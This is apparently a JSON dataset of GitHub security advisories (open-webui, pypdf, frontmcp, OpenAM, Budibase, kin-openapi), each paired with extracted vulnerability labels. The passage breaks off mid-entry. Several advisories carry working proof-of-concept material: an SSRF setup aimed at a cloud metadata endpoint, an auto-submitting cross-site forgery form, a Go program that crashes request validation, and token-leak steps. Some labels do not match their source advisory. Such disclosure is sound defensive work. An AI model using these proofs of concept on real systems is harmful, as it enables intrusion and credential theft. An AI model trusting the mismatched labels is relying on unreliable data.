@@ -1,0 +1,574 @@
+[
+  {
+    "source_ghsa_id": "GHSA-3wp3-xxj9-5jqq",
+    "input_text": "## Summary\n\nThe `get_all_models` handlers in `routers/openai.py` and `routers/ollama.py` intended to cache their **permission-filtered** model lists per user, but the `@cached` decorator was misconfigured: it passed a `key=` lambda instead of `key_builder=`. In aiocache 0.12.3 (the pinned version), `key=` is a **static** cache key \u2014 a callable passed there is used as a constant object, not invoked per call. As a result the per-user key was never computed, and all callers collided onto a single shared cache entry within the TTL window. During that window, one user's permission-filtered model list could be served to a different authenticated user, crossing the per-user authorization boundary.\n\n## Impact\n\n- **Boundary crossed:** Confidentiality (cross-user). A caller can receive the model list scoped to a *different* security principal than themselves.\n- A user (or admin, or \u2014 depending on endpoint reachability \u2014 anonymous caller) who populates the cache causes the next caller within the TTL to receive *that* list rather than their own permission-filtered one.\n- What's disclosed is the set of models another principal can access, including potentially the existence and naming of models restricted from the receiving user.\n- Exposure is **incidental and timing-dependent**, not attacker-controlled: the leaked entry is whatever the most recent caller populated within `MODELS_CACHE_TTL` (default 1 second), and the attacker cannot select the victim or force a target's list into the cache.\n\n## Affected component\n\n- `backend/open_webui/routers/openai.py` \u2014 `get_all_models` (~line 488)\n- `backend/open_webui/routers/ollama.py` \u2014 `get_all_models` (~line 302)\n\nBoth decorated with `@cached(ttl=MODELS_CACHE_TTL, key=lambda ...)`. No other `@cached(... key=lambda ...)` misuse was found elsewhere in the backend.\n\n## Root cause\n\naiocache 0.12's `@cached` treats `key=` as a static key; the per-call hook is `key_builder=` with signature `key_builder(func, *args, **kwargs)`. Passing a callable to `key=` uses the callable object itself as a constant key, so every invocation resolved to the same entry and the intended per-`user.id` namespacing never occurred.\n\n## Reproduction (default config)\n\n1. On a default deployment, configure at least two users with *different* model-access permissions (e.g. one model restricted to user A).\n2. As user A, request the model list (populates the shared cache entry).\n3. Within `MODELS_CACHE_TTL` (default 1s), as user B, request the model list.\n4. User B receives user A's permission-filtered list, including models B is not permitted to see.\n\n## Remediation\n\nReplace `key=` with `key_builder=` at both call sites and adjust the lambda to take the function as its first argument:\n\n```python\n@cached(\n    ttl=MODELS_CACHE_TTL,\n    key_builder=lambda _func, request, user=None: (\n        f'openai_all_models_{user.id}' if user else 'openai_all_models'\n    ),\n)\n```",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59213",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "open-webui",
+              "version_range": ">= 0.6.27, < 0.10.0"
+            }
+          ],
+          "cwe_category": "Use of Cache Containing Sensitive Information",
+          "severity": "low",
+          "attack_vector": "network",
+          "impact_summary": "Confidentiality risk: Unauthorized users can receive and access model lists of another user.",
+          "remediation_action": "Replace `key=` with `key_builder=` and adjust the lambda to take the function as its first argument."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-5qjq-93h5-hrgp",
+    "input_text": "### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires loading images where the declared size values are much too large compared to the actual data.\n\n### Patches\n\nThis has been fixed in [pypdf==6.14.0](https://github.com/py-pdf/pypdf/releases/tag/6.14.0).\n\n### Workarounds\n\nIf you cannot upgrade yet, consider applying the changes from PR [#3888](https://github.com/py-pdf/pypdf/pull/3888).",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59938",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "pypdf",
+              "version_range": "< 6.14.0"
+            }
+          ],
+          "cwe_category": "Memory Allocation with Excessive Size Value",
+          "severity": "medium",
+          "attack_vector": "unknown",
+          "impact_summary": "An attacker can craft a PDF leading to large memory usage by loading oversized image data.",
+          "remediation_action": "[pypdf==6.14.0] has been fixed and applying changes from PR #3888 as a workaround."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-8q49-2h5h-434x",
+    "input_text": "## Summary\n\nThe OpenAPI adapter's spec-change **poller** (`OpenApiSpecPoller`) re-fetched the\nconfigured spec `url` on a timer using a raw global `fetch()`, bypassing the SSRF\nguard (`safeFetch` / `assertUrlSafe`) that `OpenAPIToolGenerator.fromURL()` applies\nto the initial spec load. As a result, the pinning/DNS-resolution hardening delivered\nvia `mcp-from-openapi >= 2.5.0` (advisory GHSA-65h7-9wrw-629c) protected the initial\nload but **not** the recurring poll of the same URL. When polling is enabled against\nan untrusted or attacker-influenceable spec URL, this is an unguarded SSRF vector.\n\n## Details\n\nThe initial spec load is guarded. `OpenapiAdapter` resolves a secure `refResolution`\npolicy and passes it to the guarded loader:\n\n```ts\n// libs/adapters/src/openapi/openapi.adapter.ts \u2014 initializeGenerator()\nreturn await OpenAPIToolGenerator.fromURL(this.options.url, {\n  // ...\n  followRedirects: this.options.loadOptions?.followRedirects ?? false,\n  refResolution, // secure default: external $refs off, internal targets blocked\n});\n```\n\nBut the poller \u2014 which re-fetches **the same URL** on every interval \u2014 did not:\n\n```ts\n// libs/adapters/src/openapi/openapi-spec-poller.ts \u2014 doFetch() (vulnerable, <= 1.5.5)\nconst controller = new AbortController();\nconst timeout = setTimeout(() => controller.abort(), this.fetchTimeoutMs);\ntry {\n  const response = await fetch(this.url, {   // <-- raw global fetch, no SSRF guard\n    headers,\n    signal: controller.signal,\n  });\n  // ...hash the body, fire onChanged...\n}\n```\n\nBecause `doFetch()` never called `safeFetch`, none of the guard's protections applied\nto the polled request:\n\n- no allow-list / block-list enforcement (`allowedHosts` / `blockedHosts`);\n- no internal/private/loopback/link-local/CGNAT/cloud-metadata IP blocking;\n- no DNS resolution of the hostname (so a DNS name that resolves to an internal IP,\n  e.g. `http://127.0.0.1.nip.io/`, was reached);\n- no connection **pinning** to the validated IP (DNS-rebinding TOCTOU);\n- no per-hop re-validation of HTTP redirects.\n\nThis is the identical threat model to `fromURL()` / external `$ref` resolution\n(GHSA-65h7-9wrw-629c), applied to a request path that the fix for that advisory did\nnot cover.\n\n## Impact\n\nA server that enables spec polling against an untrusted or attacker-influenceable\nspec URL will, on every poll interval, issue a server-side `GET` to whatever host the\nURL (or a DNS name it resolves to, or a redirect it returns) points at \u2014 including\ninternal-only addresses unreachable from the public internet. Consequences include:\n\n- reading cloud-instance metadata endpoints (e.g. `169.254.169.254`) \u2014 credential /\n  token theft;\n- probing and reaching internal services and private-range hosts (internal network\n  scanning);\n- DNS-rebinding to swap a public host for an internal one between validation and\n  connection.\n\nThe poller issues `GET` requests only, so the primary impact is **confidentiality**\n(reaching and reading internal endpoints); the fetched body is content-hashed to\ndetect change and the subsequent tool rebuild goes back through the guarded\n`fromURL()` path.\n\n## Preconditions\n\nExploitation requires **both**:\n\n1. `polling.enabled: true` on an `OpenapiAdapter` (polling is off by default and\n   requires the URL-based `url` option, not an inline `spec`); **and**\n2. the spec `url` is untrusted / attacker-influenceable (e.g. it is derived from user\n   input, a tenant-supplied value, or otherwise not a fixed trusted constant), or an\n   otherwise-trusted spec host is attacker-controlled or can redirect.\n\nServers that poll a fixed, trusted, first-party spec URL are not exposed in practice,\nthough they still benefit from the guard as defense-in-depth.\n\n## Proof of concept\n\n```ts\nimport { OpenapiAdapter } from '@frontmcp/adapters';\n\n// url is attacker-influenceable and points (directly, via DNS, or via redirect)\n// at an internal target; polling re-fetches it every interval.\nconst adapter = OpenapiAdapter.init({\n  name: 'evil',\n  url: 'http://169.254.169.254/latest/meta-data/', // or http://127.0.0.1.nip.io/...\n  polling: { enabled: true, intervalMs: 5000 },\n});\n\nawait adapter.fetch();   // initial load IS guarded (blocked)\nadapter.startPolling();  // <= 1.5.5: each poll issues an UNGUARDED GET to the internal target\n```\n\nOn `<= 1.5.5` the timed poll reaches the internal address. On the patched version the\npoll fails closed (no request is made; the failure is logged) exactly as the initial\nload does.\n\n## Patch\n\nThe fix routes the poller through the same SSRF guard as the initial load, with the\nsame policy, so both paths share one DNS resolution + connection pinning and cannot\ndiverge:\n\n- `OpenApiSpecPoller.doFetch()` now calls `safeFetch(this.url, { headers, timeoutMs,\n  followRedirects, ssrf })` from `mcp-from-openapi` instead of the global `fetch()`.\n- `OpenapiAdapter.startPolling()` injects the adapter's resolved policy into the\n  poller: `ssrf: normalizeSsrfOptions(this.resolveRefResolution())` and\n  `followRedirects: loadOptions?.followRedirects ?? false` \u2014 identical to what\n  `fromURL()` receives.\n- `SpecPollerOptions` gained optional `ssrf` / `followRedirects`; standalone use of\n  `OpenApiSpecPoller` defaults to the secure policy (internal targets blocked,\n  redirects not followed).\n\nFiles changed:\n\n- `libs/adapters/src/openapi/openapi-spec-poller.ts`\n- `libs/adapters/src/openapi/openapi-spec-poller.types.ts`\n- `libs/adapters/src/openapi/openapi.adapter.ts`\n\nRequires `mcp-from-openapi >= 2.5.0` (already a dependency at `2.5.1`), which exports\n`safeFetch` / `normalizeSsrfOptions` and performs the resolved-IP validation and\nconnection pinning.\n\n## Remediation\n\nUpgrade `@frontmcp/adapters` to `1.5.6` or later. No configuration change is required:\npolling now inherits the same secure defaults as the initial spec load (external\ntargets blocked, redirects not followed). To poll a genuinely internal or localhost\nspec server in a trusted environment, opt in explicitly with\n`loadOptions.refResolution.allowInternalIPs: true` \u2014 the same knob that gates the\ninitial load.\n\n## Workarounds\n\nFor users who cannot upgrade immediately:\n\n- disable polling (`polling.enabled: false`) on adapters whose spec `url` is not a\n  fixed, trusted, first-party value; or\n- only enable polling against spec URLs you fully control, served over HTTPS from a\n  host that cannot be made to redirect to internal targets; and\n- enforce network egress controls / an allow-list at the platform layer so the server\n  cannot reach internal ranges or cloud-metadata endpoints.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "@frontmcp/adapters",
+              "version_range": "<= 1.5.5"
+            }
+          ],
+          "cwe_category": "Server-Side Request Forgery (SSRF)",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "Untrusted spec URLs expose internal services and metadata with potential for credential theft and internal network scanning.",
+          "remediation_action": "Enable polling of fixed, trusted spec URLs to avoid SSRF risks."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-gh7p-78x6-jw6m",
+    "input_text": "### Summary\n\nThe channel members endpoint serializes and returns **full user models** for channel participants, including settings objects. A normal user in a DM can retrieve admin-only sensitive configuration such as webhook URLs and tool server key material (`settings.ui.toolServers[].key`), which is not available via standard user info APIs.\n\n### Details\n\nThe endpoint GET `/api/v1/channels/{id}/members` returns the full serialized user model for every member in the channel. In both the DM and non-DM code paths, the handler constructs the response with `[UserModelResponse(**user.model_dump(), is_active=...)]` and returns it as the users list. Because `UserModel` (`models/users.py`) includes a settings object (`UserSettings`) and arbitrary UI configuration (`settings.ui`), the endpoint exposes other users' sensitive configuration to any channel participant.\n\nPractically, a regular user who participates in a DM or group can call `/api/v1/channels/{id}/members` and receive other members' settings, including admin-only details such as webhook notification URLs and tool server configuration, including credential fields like `settings.ui.toolServers[].key`. These values are not returned by the normal user profile endpoints (e.g., `/api/v1/users/{user_id}/info`).\n\n### PoC\n\n1. Start a local Open WebUI instance\n2. Log in as admin and in the Admin Panel, go to Settings -> General and check *Channels (Beta)*, then press Save.\n3. Create a low-privilege user in the Users tab\n4. Click on the admin's profile bottom left, Settings and Integrations. Then click the `+` after *Manage Tool Servers* to add some tool server with a secret Bearer token (eg. `KEY`)\n5. Log in as the attacker with the low-privilege account and create a new Direct Message channel with the admin user:\n\n<img width=\"690\" height=\"383\" alt=\"image\" src=\"https://github.com/user-attachments/assets/70208661-a0db-4457-9984-119056ca3daf\" />\n\n7. After creating, open DevTools with F12 and go to the Network tab. Then in the DM UI click on the *Users* icon top right to see the members. In the network tab, this should have triggered a `/api/v1/channels/{id}/members` request which responds with the `settings` key including `toolServers` and `key` values:\n\n<img width=\"1642\" height=\"577\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6639d982-a156-4e8b-861e-587d86d9b152\" />\n\nThe attacker has now leaked the admin's bearer token for the toolserver they configured.\n\n### Impact\n\nConditions for exploit: channels are enabled and an attacker has a low-privilege account.\n\nWebhook URLs and tool server configurations (including bearer keys) can be exfiltrated from any user.\n\n### Original Agent Report\n\n<img width=\"400\" alt=\"app aikido dev_ai-pentests_projects_116389_assessments_019d67d4-81c8-7dd2-bb9e-0a4a774b2c78_issues_sidebarIssue=20440423 (4)\" src=\"https://github.com/user-attachments/assets/8415553a-9f1e-4f73-929c-aa0d18a101ca\" />",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59222",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "open-webui",
+              "version_range": ">= 0.7.0, < 0.10.0"
+            }
+          ],
+          "cwe_category": "Exposure of Sensitive Information to an Unauthorized Actor",
+          "severity": "medium",
+          "attack_vector": "unknown",
+          "impact_summary": "Users can expose and exfiltrate sensitive admin settings such as webhook URLs and tool server configurations including bearer keys from any low-privilege account.",
+          "remediation_action": "Disable channels feature or restrict access to the `/api/v1/channels/{id}/members` endpoint to authenticated users with appropriate permissions."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-vqxv-6xrh-49cp",
+    "input_text": "### Description\nThe OAuth2/OIDC consent page rendered for `display=wap` authorize requests reflected several request-derived values into the HTML response without escaping. An attacker who induces a user with an active OpenAM session to follow a crafted authorize link can execute arbitrary JavaScript in the OpenAM origin.\n\nThis is the same vulnerability class as CVE-2026-44203; that fix did not cover this code path.\n\n### Impact\nArbitrary JavaScript execution in the OpenAM origin in the victim's authenticated context \u2014 enabling session/cookie theft, CSRF-token exfiltration, and actions on behalf of the victim, up to administrative takeover if the victim is an administrator. Reachable on any deployment with at least one registered OAuth2 client; no attacker-controlled client and no special configuration required.\n\n### Mitigation\n- Upgrade to 16.1.2 (or later).\n- Until then, restrict/limit access to the OAuth2 authorize endpoint and treat unsolicited `display=wap` authorize links as untrusted.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-62280",
+          "affected_products": [
+            {
+              "vendor": "MAVEN",
+              "product": "org.openidentityplatform.openam:openam-oauth2",
+              "version_range": ">= 13.0.0, <= 16.1.1"
+            }
+          ],
+          "cwe_category": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "Arbitrary JavaScript execution leading to session theft and administrative takeover.",
+          "remediation_action": "Upgrade to version 16.1.2 (or later). Until then, restrict access to OAuth2 authorize endpoint."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-pvcr-8mvp-w8qr",
+    "input_text": "### Summary\n\nThe Budibase AI chat-link handoff flow (`GET/POST /api/chat-links/:instance/:token/handoff`) binds an **external chat identity** (Slack/Discord/MS Teams/Telegram) to a **Budibase user account**. The confirmation endpoint is on a **public route** (no CSRF middleware, no auth-group gate) and the only credential it checks is a `confirmationToken` that is **already rendered in plaintext into the HTML confirmation page** the victim views. There is no binding between the confirmation token and the requester's Budibase session at preparation time, and no CSRF token on the POST.\n\nConsequently, an attacker who creates a chat-link session for **their own** external chat identity (or any identity they can mint in their chat platform) can induce a victim Budibase user (same tenant) to submit the confirmation POST -> for example by sending them a link that auto-submits, or by XSS/CSRF on a co-tenanted page -> and the victim's `globalUserId` becomes bound to the attacker's external identity. The attacker then sends messages to the AI agent from their chat platform and is **acting as the victim user** inside Budibase automations/agent operations, inheriting the victim's permissions on agent operations, knowledge sources, and any downstream automation steps keyed off the linked identity.\n\n---\n\n### Affected\n\n| Component | Path | Lines |\n|---|---|---|\n| Public handoff routes (no auth-group middleware) | `packages/server/src/api/routes/chat.ts` | `23` (`GET /api/chat-links/:instance/:token/handoff`), `27` (`POST .../handoff`) |\n| Confirmation controller | `packages/server/src/api/controllers/ai/chatIdentityLinks.ts` | `124-177` (`confirmChatLinkSession`); the binding at `153-173` |\n| Confirmation token rendered into HTML | `packages/server/src/api/controllers/ai/chatIdentityLinks.ts` | `40-60` (`renderLinkConfirmationPage`); the hidden input at `55` |\n| Session creation (attacker side) | `packages/server/src/sdk/workspace/ai/chatIdentityLinks.ts` | `138-171` (`createChatIdentityLinkSession`), `173-188` (`prepareChatIdentityLinkSessionConfirmation`) |\n| Upsert of identity link | `packages/server/src/sdk/workspace/ai/chatIdentityLinks.ts` | `201-250` (`upsertChatIdentityLink`) |\n\n**Affected versions:** `master` at commit `3c8d1b4023`.\n\n**Reachable over HTTP by:** the GET and POST are on `publicRoutes` (no auth-group middleware). The POST requires `ctx.isAuthenticated` at runtime (`controllers/ai/chatIdentityLinks.ts:142`) -> so the victim must be logged into Budibase when the POST fires (achievable via standard CSRF if cookies are sent cross-origin, or via phishing that lures the victim to submit).\n\n---\n\n### Root cause\n\n**Issue 1 -> The handoff routes are public and unauthenticated at the middleware layer.**\n\n```ts\n// packages/server/src/api/routes/chat.ts:23, 27\npublicRoutes.get(\"/api/chat-links/:instance/:token/handoff\", ai.handoffChatLinkSession)\npublicRoutes.post(\"/api/chat-links/:instance/:token/handoff\", ai.confirmChatLinkSession)\n```\n\n`publicRoutes` has **no group middleware** (`endpointGroups/standard.ts:24-25` calls `endpointGroupList.group()` with no middleware and then `.lockMiddleware()`). The routes do not have a per-route `authorized(...)`. There is **no CSRF middleware** on these routes -> Budibase's CSRF synchroniser token is enforced only for state-changing verbs on authenticated routes that are not in `NO_CSRF_ENDPOINTS`; the public-routes path bypasses it.\n\n**Issue 2 -> The confirmation token is exposed to anyone who views the GET page.**\n\n```ts\n// packages/server/src/api/controllers/ai/chatIdentityLinks.ts:40-60\nconst renderLinkConfirmationPage = (session, action) => {\n  ...\n  return `<!doctype html>...\n    <form method=\"post\" action=\"${helpers.escapeHtml(action)}\">\n      <input type=\"hidden\" name=\"confirmationToken\" value=\"${helpers.escapeHtml(session.confirmationToken)}\">\n      <button type=\"submit\">Confirm</button>\n    </form>\n  ...`\n}\n```\n\nThe `confirmationToken` (a `newid()` UUIDv4 generated by `prepareChatIdentityLinkSessionConfirmation`) is rendered into a hidden form input. Anyone who loads the GET page sees the token in the page source.\n\n**Issue 3 -> The POST binds the **currently-authenticated user** to the external identity based solely on the confirmation token.**\n\n```ts\n// packages/server/src/api/controllers/ai/chatIdentityLinks.ts:124-177\nexport async function confirmChatLinkSession(ctx) {\n  ...\n  if (!ctx.isAuthenticated) { throw new HTTPError(\"Authentication is required to link chat identity\", 401) }\n  if (!session.confirmationToken || ctx.request.body?.confirmationToken !== session.confirmationToken) {\n    throw new HTTPError(\"Link confirmation is invalid or has expired\", 400)\n  }\n\n  const currentGlobalUserId = getCurrentGlobalUserId(ctx)        // <- victim's ID\n  const consumedSession = await sdk.ai.chatIdentityLinks.consumeChatIdentityLinkSession(token)\n  ...\n  await sdk.ai.chatIdentityLinks.upsertChatIdentityLink({\n    provider: consumedSession.provider,\n    externalUserId: consumedSession.externalUserId,              // <- attacker's chat identity\n    externalUserName: consumedSession.externalUserName,\n    ...\n    globalUserId: currentGlobalUserId,                            // <- bound to victim\n    linkedBy: currentGlobalUserId,\n  })\n  ...\n}\n```\n\nThere is **no binding between the session and the requester's Budibase identity at preparation time**. `prepareChatIdentityLinkSessionConfirmation` (`sdk/workspace/ai/chatIdentityLinks.ts:173-188`) stores the `confirmationToken` keyed by `token` with no user-id field. Whoever is authenticated when the POST fires (and supplies the correct `confirmationToken`) gets bound.\n\n**Issue 4 -> `assertSessionMatchesInstance` only checks workspace ID, not user.**\n\n```ts\n// packages/server/src/api/controllers/ai/chatIdentityLinks.ts:17-27\nconst assertSessionMatchesInstance = ({ workspaceId, instance }) => {\n  if (!workspaceId || workspaceId !== instance) {\n    throw new HTTPError(\"Link token is not valid for this workspace\", 400)\n  }\n}\n```\n\nThe check confirms the session belongs to the same workspace as the URL `instance` param -> useful for preventing cross-workspace confusion but useless against same-tenant identity confusion.\n\n---\n\n### Reproduction\n\n**Step-by-step attack**\n\n1. **Attacker (tenant T) provisions a chat-link session for their own external identity.** Via the agent channel provisioning flow (e.g. `POST /api/agent/:agentId/slack/provision` or via the Discord/MS Teams/Telegram provisioning endpoints), the attacker obtains a chat-link `token` bound to **their own** Slack user ID. The session is stored in Redis keyed by `token`, scoped to tenant T.\n\n2. **Attacker triggers `prepareChatIdentityLinkSessionConfirmation`.** Either by GETting the handoff page themselves (if they have a Budibase session) or via an internal API. The `confirmationToken` is generated and stored.\n\n3. **Attacker crafts a phishing/auto-submit page** that POSTs to `/api/chat-links/<instance>/<token>/handoff` with the leaked `confirmationToken` in the body. Example:\n\n   ```html\n   <form id=\"f\" method=\"post\" action=\"https://victim.budibase.app/api/chat-links/app_xxx/linktoken/handoff\">\n     <input name=\"confirmationToken\" value=\"<leaked-token>\">\n   </form>\n   <script>document.getElementById('f').submit()</script>\n   ```\n\n4. **Victim (a Budibase user in tenant T, e.g. an admin) is lured to the attacker page** while logged into Budibase. Their browser sends the POST cross-origin. If the Budibase auth cookie is sent on cross-site requests (`SameSite=Lax` by default allows top-level POST navigations, which a form-submit is), the request is authenticated as the victim.\n\n5. **The victim's `globalUserId` is now bound to the attacker's Slack identity.** When the attacker DMs the AI agent from Slack, the agent's operations run as the victim user -> with the victim's permissions on agent operations, knowledge sources, file uploads, and any downstream automation steps keyed off the linked identity.\n\n**Mitigating factors:**\n- `SameSite=Lax` cookies block cross-site POSTs from sub-resources (fetch / XHR) but **allow** top-level form-POST navigations. A phishing page that submits the form via `document.form.submit()` (a top-level navigation) succeeds. So the CSRF works with the default cookie policy.\n- The attack is **same-tenant only** (`session.tenantId !== context.getTenantId()` is checked in the sdk).\n- The attacker must induce the victim to click a link (standard phishing). No silent drive-by.\n\n---\n\n### Impact\n\n| Capability | Available |\n|---|---|\n| Bind an attacker-controlled chat identity to a victim's Budibase account | \u2705 |\n| Send messages to the AI agent as the victim user (Slack/Discord/MS Teams/Telegram) | \u2705 |\n| Inherit the victim's permissions on agent operations | \u2705 |\n| Trigger automations / agent operations that the victim is authorised for | \u2705 |\n| Read knowledge sources the victim has access to | \u2705 |\n\nThe severity depends on what the agent can do as the victim. For an admin victim, this is full tenant administration via chat. For a regular user, it is impersonation within the agent subsystem. The bound identity persists until manually unlinked, so the attacker retains ongoing access.\n\nThis is a same-tenant, user-interaction-required primitive. It is below the \"unauthenticated RCE\" threshold but above \"hardening\" -> it is a real authentication-confusion vulnerability on a sensitive identity-binding operation.\n\n---\n\n### Fix\n\n**Recommended layered fixes:**\n\n1. **Bind the confirmation token to the requester's Budibase session at preparation time.** In `prepareChatIdentityLinkSessionConfirmation`, store the `globalUserId` of the requester alongside the `confirmationToken`. In `confirmChatLinkSession`, verify that `getCurrentGlobalUserId(ctx)` matches the stored requester. This breaks the CSRF / cross-user confusion.\n\n2. **Add a CSRF token to the confirmation POST.** The standard Budibase CSRF synchroniser token (`x-csrf-token` header, validated against the session's `csrfToken`) should be enforced on `POST /api/chat-links/.../handoff`. Move the route out of `publicRoutes` to an authenticated route group so CSRF applies (the GET can remain public for the redirect-to-login flow; the POST should be authenticated + CSRF-protected).\n\n3. **Add a per-session nonce that is bound to the requester's browser** (e.g. a signed cookie set on the GET, validated on the POST) to prevent cross-origin submission even when `SameSite=Lax` allows it.\n\n4. **Require user re-authentication (re-entry of password / step-up auth)** for sensitive identity-binding operations, similar to how password change requires re-auth.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "@budibase/server",
+              "version_range": "<= 3.38.1"
+            }
+          ],
+          "cwe_category": "Improper Authorization",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "An attacker can induce a victim to bind their external identity to an attacker's account, allowing them to impersonate the victim for agent operations and downstream automation steps.",
+          "remediation_action": "Implement CSRF middleware on public routes to protect against cross-site request forgery attacks."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-jpcw-4wr7-c3vq",
+    "input_text": "| Field | Value |\n|---|---|\n| Ecosystem | Go |\n| Package | `github.com/getkin/kin-openapi` |\n| Affected versions | `<= 0.143.0` (introduced in `v0.2.0`, PR #90, 2019-05-07; reproduced on `HEAD` `30e2923`) |\n| Patched versions | 0.144.0 |\n---\n\n### Summary\n\n`openapi3filter.ValidateRequest` contains a NULL-pointer-dereference denial of service: any **unauthenticated** client can crash the request-validation path with a **single** HTTP request. When an operation declares a `content` parameter (as opposed to a `schema` parameter) whose media type object has **no `schema`**, request validation dereferences that missing schema and panics. The document is legal under the OpenAPI Specification \u2014 kin-openapi's own `doc.Validate()` accepts it \u2014 and the defect affects **both OpenAPI 3.0.x and 3.1.x**. Depending on how the library is wired into the server (see Impact), this ranges from a per-request abort with unbounded panic-log growth to a full remote process crash.\n\n### Details\n\nThe decoder used for `content` parameters when no custom `ParamDecoder` is configured (the library default), `defaultContentParameterDecoder`, dereferences the media-type schema without a nil check.\n\n`openapi3filter/req_resp_decoder.go`, around line 197:\n\n```go\nmt := content.Get(\"application/json\")\nif mt == nil {                       // media-type OBJECT is guarded ...\n    err = fmt.Errorf(\"parameter %q has no content schema\", param.Name)\n    return\n}\noutSchema = mt.Schema.Value          // ... but mt.Schema is NOT \u2014 panics when nil\n```\n\nThe function guards `param.Content == nil`, `len(content) != 1`, and `mt == nil`, but never `mt.Schema == nil`.\n\n**Why a schema-less content parameter is legal** (so the sink is reachable \u2014 `doc.Validate()` returns no error), in both 3.0.x and 3.1.x:\n\n- `openapi3/parameter.go` \u2014 `Parameter.Validate` only enforces *exactly one of `schema` XOR `content`*; a parameter with `content` (and no `schema`) satisfies it.\n- `openapi3/media_type.go` \u2014 `MediaType.Validate` validates the schema **only when it is non-nil**, so an absent schema is not a validation error.\n\n**Call path to the panic:**\n\n```\nValidateRequest                          openapi3filter/validate_request.go:83\n  \u2514\u2500 ValidateParameter                   openapi3filter/validate_request.go:177   (parameter.Content != nil)\n       \u2514\u2500 decodeContentParameter         openapi3filter/req_resp_decoder.go:166   (attacker supplies value \u21d2 found)\n            \u2514\u2500 defaultContentParameterDecoder   openapi3filter/req_resp_decoder.go:197   \u2190 nil deref / panic\n```\n\n**Authentication note:** `ValidateRequest` validates security *before* parameters, but the panic is reachable **without credentials** whenever the target operation declares no security requirement, or when no `AuthenticationFunc` is configured (it is opt-in). A single unauthenticated operation anywhere in the served spec is sufficient. If an operation *does* declare security and a rejecting `AuthenticationFunc` is wired, that request is rejected before decoding.\n\n### PoC\n\nReproduced end-to-end against `HEAD` (`30e2923`) with a real `net/http` server and a stock `http.Client`.\n\n**1. Minimal OpenAPI 3.0.3 document** (legal \u2014 `doc.Validate()` passes). The `cfg` query parameter uses `content` with an `application/json` media type that has **no `schema`**:\n\n```yaml\nopenapi: 3.0.3\ninfo: {title: poc, version: \"1.0.0\"}\npaths:\n  /c:\n    get:\n      parameters:\n        - name: cfg\n          in: query\n          content:\n            application/json: {}      # media type object with NO schema\n      responses:\n        \"200\": {description: ok}\n```\n\n**2. A complete, self-contained program.** Drop this into a directory inside a checkout of `github.com/getkin/kin-openapi` and run it with `go run .`. It loads the document above, asserts `doc.Validate()` accepts it (proving reachability), serves it behind request validation exactly as the recommended middleware does, and sends one unauthenticated `GET /c?cfg=1`:\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/http/httptest\"\n\n\t\"github.com/getkin/kin-openapi/openapi3\"\n\t\"github.com/getkin/kin-openapi/openapi3filter\"\n\t\"github.com/getkin/kin-openapi/routers/gorillamux\"\n)\n\nconst spec = `\nopenapi: 3.0.3\ninfo: {title: poc, version: \"1.0.0\"}\npaths:\n  /c:\n    get:\n      parameters:\n        - name: cfg\n          in: query\n          content:\n            application/json: {}      # media type object with NO schema\n      responses:\n        \"200\": {description: ok}\n`\n\nfunc main() {\n\tloader := openapi3.NewLoader()\n\tdoc, err := loader.LoadFromData([]byte(spec))\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\t// Reachability: the malformed-but-legal document must validate.\n\tif err := doc.Validate(context.Background()); err != nil {\n\t\tpanic(\"doc.Validate rejected the spec, not reachable: \" + err.Error())\n\t}\n\trouter, err := gorillamux.NewRouter(doc)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Handler mirrors openapi3filter.ValidationHandler: find route, validate.\n\th := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\troute, pathParams, err := router.FindRoute(r)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusNotFound)\n\t\t\treturn\n\t\t}\n\t\t// Panics here on the crafted request (req_resp_decoder.go:197).\n\t\tif err := openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{\n\t\t\tRequest:    r,\n\t\t\tPathParams: pathParams,\n\t\t\tRoute:      route,\n\t\t\tOptions:    &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},\n\t\t}); err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\t\tw.WriteHeader(http.StatusOK)\n\t})\n\n\tsrv := httptest.NewServer(h)\n\tdefer srv.Close()\n\n\t// The single, unauthenticated attack request.\n\tresp, err := http.Get(srv.URL + \"/c?cfg=1\")\n\tif err != nil {\n\t\t// Expected: the server goroutine panicked, so the client sees EOF.\n\t\tfmt.Printf(\"client received an aborted response (expected): %v\\n\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tfmt.Printf(\"UNEXPECTED: got HTTP %d without a panic\\n\", resp.StatusCode)\n}\n```\n\n**3. Observed result** \u2014 the request goroutine panics inside validation, and the client's `http.Get` returns an EOF:\n\n```\nhttp: panic serving 127.0.0.1:xxxxx: runtime error: invalid memory address or nil pointer 